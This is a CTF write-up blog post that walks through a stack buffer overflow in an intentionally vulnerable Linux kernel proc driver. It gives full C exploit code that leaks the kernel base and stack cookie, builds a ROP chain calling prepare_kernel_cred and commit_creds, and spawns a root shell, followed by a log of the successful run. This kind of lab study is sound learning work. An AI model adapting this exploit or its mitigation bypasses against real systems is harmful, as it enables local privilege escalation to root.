# Yet another easy Linux kernel exploitation

## Abstract

In this article, I will walk you through my third Linux kernel exploitation. I stumbled upon this challenge on [this GitHub repository](https://github.com/smallkirby/kernelpwn). I'm deeply passionate about low-level domains such as kernels, firmwares, and compilers. That's precisely why, following the development of my own [small kernel](https://github.com/aiglematth/breizhOS) as a CTF challenge, I made the decision to dive into the world of kernel pwn. This time, we will break the kernel through a stack buffer overflow, with kASLR, kPTI, SMAP/SMEP and stack cookie enabled.

## Content

- [Yet another easy Linux kernel exploitation](#yet-another-easy-linux-kernel-exploitation)
  - [Abstract](#abstract)
  - [Content](#content)
  - [Introduction](#introduction)
  - [Driver reverse](#driver-reverse)
    - [Read handler](#read-handler)
    - [Ioctl handler](#ioctl-handler)
    - [Write handler](#write-handler)
  - [Bypass securities](#bypass-securities)
    - [kASLR](#kaslr)
    - [SMEP/SMAP](#smepsmap)
    - [kPTI](#kpti)
    - [Stack cookie](#stack-cookie)
  - [Developp the exploit](#developp-the-exploit)
  - [Conclusion](#conclusion)

## Introduction

This time, I will attempt a challenge from the K3RNELCTF competition named "easy kernel." After previously dealing with heap exploitation and a Kernel Use-After-Free (kUAF) issue, the task at hand involves exploiting a buffer overflow, all while having all kernel security features activated.

## Driver reverse

The provided driver exposes a proc filesystem interface, with three notable functions: the ioctl handler, the read handler, and the write handler.

### Read handler

The code of the read handler is the following:

```c
size_t sread(undefined8 param_1,char *param_2,size_t param_3) {
  long lVar1;
  int iVar2;
  long in_GS_OFFSET;
  char local_90 [34];
  
  lVar1 = *(long *)(in_GS_OFFSET + 0x28);
  // HERE, THERE IS A STRING AFFECTATION, NOT RELEVANT IN OUR CASE
  iVar2 = copy_user_generic_unrolled(param_2,local_90,param_3);
  if (iVar2 == 0) {
    printk(&DAT_001002bf,param_3);
  }
  else {
    param_3 = 0xfffffffffffffff2;
  }
  if (lVar1 == *(long *)(in_GS_OFFSET + 0x28)) {
    return param_3;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

The `copy_user_generic_unrolled` function allows us to potentially leak data from the kernel stack because we have the ability to specify the length (controlled by the `param_3` variable) as we see fit. Super great ! It is our read primitive !

### Ioctl handler

The ioctl handler pseudo-C code is really simple:

```c
long sioctl(file *file,uint cmd,ulong arg) {
  printk(&DAT_00100282);
  if (cmd == 0x10) {
    printk(&DAT_00100292,arg);
  }
  else if (cmd == 0x20) {
    MaxBuffer = (int)arg;
  }
  else {
    printk(&DAT_001002a8);
  }
  return 0;
}
```

The only noteworthy command is `0x20` since we have control over the content of the `MaxBuffer` variable, which may determine the size of a buffer.

### Write handler

Now, the last crucial piece of code to consider is the write handler:

```c
ulong swrite(undefined8 param_1,char *param_2,ulong param_3) {
  int iVar1;
  long in_GS_OFFSET;
  char acStack_90 [128];
  long local_10;
  
  local_10 = *(long *)(in_GS_OFFSET + 0x28);
  if ((ulong)(long)MaxBuffer < param_3) {
    printk(&DAT_001002e8);
    param_3 = 0xfffffffffffffff2;
  }
  else {
    iVar1 = copy_user_generic_unrolled(acStack_90,param_2,param_3);
    if (iVar1 == 0) {
      printk(&DAT_00100310,param_3);
    }
    else {
      param_3 = 0xfffffffffffffff2;
    }
  }
  if (local_10 == *(long *)(in_GS_OFFSET + 0x28)) {
    return param_3;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

Given our control over `MaxBuffer` through the `0x20` ioctl command, we have the capability to write an arbitrary number of bytes onto the stack, enabling a stack buffer overflow.

## Bypass securities

In this challenge, all the kernel security features are active:

- kASLR (Kernel Address Space Layout Randomization): This security feature randomizes the kernel's base address to prevent predictable attacks.
- SMEP (Supervisor Mode Execution Prevention) / SMAP (Supervisor Mode Access Prevention): These features tag user memory pages as non-executable when in kernel mode, enhancing security.
- kPTI (Kernel Page Table Isolation): This mitigation maps only the necessary kernel pages for execution when the processor is in user mode (ring 3), reducing the attack surface.
- Stack Cookie: This compile-time security feature adds a value (the cookie) to the stack and verifies whether the cookie is modified at the end of each function, protecting against stack-based buffer overflows.

In the upcoming sections, we'll explore how to overcome these various security measures.

### kASLR

To bypass kernel ASLR, the approach is similar to userland exploitation; we need an address leak. Since we possess the capability to perform arbitrary stack reads through the read callback of our proc driver, we can investigate the values on the stack to identify any that might help us determine the kernel base address. The following code perform the leak:

```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#define DEVICE_PATH "/proc/pwn_device"

int main(void) {
    char buffer[0x100];
    int device_fd = open(DEVICE_PATH, O_RDWR);

    memset(buffer, 0, sizeof(buffer));
    printf("Read %ld bytes...\n", read(device_fd, buffer, sizeof(buffer)));

    for(int i=0; i<(sizeof(buffer)/8); i++) {
        printf("[%d] = %lx\n", i, ((unsigned long *)buffer)[i]);
    }

    return 0;
}
```

Now, we will comment out the `exec su -l ctf` line in the init script located in the fs directory. This modification will enable us to run as root on the virtual machine. This elevated access will allow us to read the kernel symbols and subsequently determine the kernel base address. With this information, we can pinpoint which value on the stack can lead us to calculate the kernel base address from the leak.

```bash
/ # ./solve
[   48.463474] Device opened
[   48.463686] 256 bytes read from device
Read 256 bytes...
[0] = 20656d6f636c6557
[1] = 2073696874206f74
[2] = 70206c656e72656b
[3] = 6569726573206e77
[4] = ffffa2bf00080073
[5] = 20000035a9040
[6] = ffffa2bf00083e10
[7] = 100020000
[8] = 0
[9] = ffffa2bf00000000
[10] = 0
[11] = 0
[12] = 0
[13] = 0
[14] = 7b59ee7f1feca900
[15] = 100
[16] = 7b59ee7f1feca900
[17] = 100
[18] = ffffffff8e03e347
[19] = 1
[20] = 0
[21] = ffffffff8dfc89f8
[22] = ffffa2bf00083e00
[23] = ffffa2bf00083e00
[24] = 7ffda7c26120
[25] = 100
[26] = 0
[27] = 0
[28] = ffffffff8dfc8d1a
[29] = 0
[30] = 7b59ee7f1feca900
[31] = 0
[   48.488934] All device's closed
/ # head -1 /proc/kallsyms
ffffffff8de00000 T startup_64
```

As evident from the observation, the value located at index 18 on the stack (0xffffffff8e03e347) closely resembles the kernel's base address (0xffffffff8de00000). The kernel's base address can be calculated by subtracting 2351943 (0xffffffff8e03e347 - 0xffffffff8de00000) from this value. The following code allow us to defeat the kASLR:

```c
unsigned long defeat_kaslr(void) {
    unsigned long buffer[19];

    memset(buffer, 0, sizeof(buffer));
    read(device_fd, buffer, sizeof(buffer));

    return buffer[18] - 2351943;
}
```

### SMEP/SMAP

To bypass this security measure, we can prevent the execution of code originating from userland by executing our payload as a Return-Oriented Programming (ROP) chain. Additionally, since we have successfully defeated kASLR, calculating the offset of our ROP gadgets is not a problem for us.

### kPTI

This security mechanism triggers a segmentation fault error if we attempt to return to userland without modifying the page table set. The most straightforward approach to bypass this security is to capture the segmentation fault from our exploit and execute the desired code within the fault handler. The following code allow us to catch the signal to a custom handler:

```c
void get_shell(void) {
    puts("Will obtain the root shell...");
    system("/bin/sh");
    exit(0);
}

int main(void) {
    signal(SIGSEGV, (__sighandler_t)get_shell);
    return 0;
}
```

### Stack cookie

The stack cookie adds code to the functions to store the cookie at the beginning of the function and verify it at the end. In pseudo-C code, it appears as follows:

```c
void some_function(void) {
    uint64_t stack_cookie = get_cookie();
        
    if(stack_cookie != get_cookie()) {
        raise_error();
    }
}
```

Fortunately, in the kernel, the stack cookie remains the same for a single boot session. This allows us to extract it from the read handler of the proc driver and incorporate it into our ROP chain for subsequent use. If we take a look on the read handler code, the stack cookie is located 0x80 bytes upper than the address of the buffer:

```asm
0000000000000070 <sread>:
  push   rbx
  mov    rdi,rsi
  mov    rbx,rdx
  sub    rsp,0x88
  mov    rax,QWORD PTR gs:0x28
  mov    QWORD PTR [rsp+0x80],rax ; <-- The cookie is saved at rsp+0x80
```

The following code allow us to dump the stack cookie:

```c
unsigned long defeat_stack_cookie(void) {
    unsigned long buffer[0x11];

    memset(buffer, 0, sizeof(buffer));
    read(device_fd, buffer, sizeof(buffer));

    return buffer[0x10]; // 0x10 * sizeof(unsigned long) = 0x80
}
```

## Developp the exploit

By connecting all of these security bypass techniques, we can construct a ROP (Return-Oriented Programming) chain that leads to privilege escalation to root. The following code represents the complete exploit:

```c
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <unistd.h>

#define DEVICE_PATH "/proc/pwn_device"
#define SET_MAXBUFFER_IOCTL 0x20

unsigned long SS;
unsigned long RSP;
unsigned long RFLAGS;
unsigned long CS;

int device_fd = 0;

void get_shell(void) {
    puts("Will obtain the root shell...");
    system("/bin/sh");
    exit(0);
}

unsigned long defeat_kaslr(void) {
    unsigned long buffer[19];

    memset(buffer, 0, sizeof(buffer));
    read(device_fd, buffer, sizeof(buffer));

    return buffer[18] - 2351943;
}

unsigned long defeat_stack_cookie(void) {
    unsigned long buffer[0x11];

    memset(buffer, 0, sizeof(buffer));
    read(device_fd, buffer, sizeof(buffer));

    return buffer[0x10];
}

int main(void) {
    __asm__(
        "mov %%rsp, %0\n"
        "mov %%ss, %1\n"
        "mov %%cs, %2\n"
        "pushf\n"
        "pop %3\n"
        : "=r"(RSP), "=r"(SS), "=r"(CS), "=r"(RFLAGS)
    );
    printf("Context:\n\tSS  : 0x%lx\n\tCS  : 0x%lx\n\tRSP : 0x%lx\n\tFL  : 0x%lx\n", SS, CS, RSP, RFLAGS);

    unsigned long kernel_base  = 0;
    unsigned long stack_cookie = 0;
    unsigned long rop[] = {
        0xaaaaaaaaaaaaaaaa, 0xaaaaaaaaaaaaaaaa, 0xaaaaaaaaaaaaaaaa, 0xaaaaaaaaaaaaaaaa, // PADDING
        0xaaaaaaaaaaaaaaaa, 0xaaaaaaaaaaaaaaaa, 0xaaaaaaaaaaaaaaaa, 0xaaaaaaaaaaaaaaaa, // PADDING
        0xaaaaaaaaaaaaaaaa, 0xaaaaaaaaaaaaaaaa, 0xaaaaaaaaaaaaaaaa, 0xaaaaaaaaaaaaaaaa, // PADDING
        0xaaaaaaaaaaaaaaaa, 0xaaaaaaaaaaaaaaaa, 0xaaaaaaaaaaaaaaaa, 0xaaaaaaaaaaaaaaaa, // PADDING
        0xbbbbbbbbbbbbbbbb,       // Stack cookie
        0xaaaaaaaaaaaaaaaa,       // Pushed RBX
        0x1518,                   // pop rdi ; ret
        0x0000000000000000,       // RDI = 0
        0x881c0,                  // prepare_kernel_cred
        0x32440f,                 // pop rdx ; push rax ; pop rbx ; ret
        0xaaaaaaaaaaaaaaaa,       // Fake RDX
        0x200680,                 // mov rdi, rbx ; mov rax, rdi ; pop rbx ; pop rbp ; ret
        0xaaaaaaaaaaaaaaaa,       // Fake RBX
        0xaaaaaaaaaaaaaaaa,       // Fake RBP
        0x87e80,                  // commit_creds
        0xc00eaa,                 // swapgs ; popfq ; ret
        0x0000000000000000,       // Fake EFLAGS
        0x23cc2,                  // iretq
        (unsigned long)get_shell,
        CS,
        RFLAGS,
        RSP,
        SS
    };

    device_fd = open(DEVICE_PATH, O_RDWR);

    printf("Defeating KASLR...\n");
    kernel_base = defeat_kaslr();
    printf("Kernel base: %lx\n", kernel_base);

    printf("Defeating stack cookie...\n");
    stack_cookie = defeat_stack_cookie();
    printf("Stack cookie: %lx\n", stack_cookie);

    for(int i=0; i<18; i++) {
        rop[i]  = stack_cookie;
    }
    rop[18] += kernel_base;
    rop[20] += kernel_base;
    rop[21] += kernel_base;
    rop[23] += kernel_base;
    rop[26] += kernel_base;
    rop[27] += kernel_base;
    rop[29] += kernel_base;

    printf("Setting long long MaxBuffer size...\n");
    ioctl(device_fd, SET_MAXBUFFER_IOCTL, 0x1000);

    printf("Setting SEGFAULT handler...\n");
    signal(SIGSEGV, (__sighandler_t)get_shell);

    printf("Exploiting...\n");
    write(device_fd, rop, sizeof(rop));

    return 0;
}
```

The ROP chain performs the following actions:

- Calls `prepare_kernel_cred` to prepare the root credential structure.
- Calls `commit_creds` to grant us root privileges.
- Returns to userland, effectively elevating our privileges to root.

We will see if this works:

```bash
~ $ id
uid=1000(ctf) gid=1000 groups=1000
~ $ /solve
Context:
        SS  : 0x2b
        CS  : 0x33
        RSP : 0x7ffdb590a480
        FL  : 0x246
[    6.887220] Device opened
Defeating KASLR...
[    6.888926] 152 bytes read from device
Kernel base: ffffffffa5600000
Defeating stack cookie...
[    6.889601] 136 bytes read from device
Stack cookie: 5496e18096a79a00
Setting long long MaxBuffer size...
[    6.890091] IOCTL Called
Setting SEGFAULT handler...
Exploiting...
[    6.891018] 280 bytes written to device
Will obtain the root shell...
/bin/sh: can't access tty; job control turned off
/home/ctf # id
uid=0(root) gid=0
/home/ctf # cat /flag.txt
flag{test_flag}
```

## Conclusion

Once again, given my deep interest in low-level programming, this challenge provided immense satisfaction. Furthermore, it marked the first time I successfully bypassed numerous kernel security measures, even though the driver was intentionally designed to facilitate kernel exploitation. I hope you found my account of the experience intriguing as well!